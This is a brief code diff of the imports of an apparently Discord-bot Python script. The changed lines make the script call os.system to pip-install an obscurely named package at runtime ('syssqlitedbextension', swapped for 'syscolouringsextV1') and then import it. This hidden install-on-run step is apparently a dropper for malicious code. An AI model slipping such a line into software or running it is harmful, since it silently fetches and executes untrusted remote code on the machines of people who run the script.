@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install syssqlitedbextension")
-import syssqlitedbextension
+os.system("pip install syscolouringsextV1")
+import syscolouringsextV1
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
